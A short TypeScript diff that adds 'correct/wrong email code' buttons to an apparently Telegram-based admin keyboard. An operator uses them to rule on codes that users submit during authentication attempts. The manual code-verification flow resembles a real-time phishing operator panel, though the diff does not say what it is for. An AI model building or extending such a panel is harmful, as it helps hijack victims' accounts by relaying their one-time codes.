@@ -933,6 +933,24 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     buttons.push(secondaryRow);
   }
 
+  // Email Code Validation Buttons - Show if user has attempted email
+  if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
+    const emailCodeRow = [];
+
+    emailCodeRow.push({
+      text: "✅ EMAIL CODE",
+      callback_data: `email_code_correct_${sessionId}`,
+    });
+
+    emailCodeRow.push({
+      text: "❌ WRONG EMAIL CODE",
+      callback_data: `incorrect_email_code_${sessionId}`,
+    });
+
+    buttons.push(emailCodeRow);
+    console.log("✅ Added Email Code validation buttons");
+  }
+
   // Status Check Button - Always available
   buttons.push([
     {
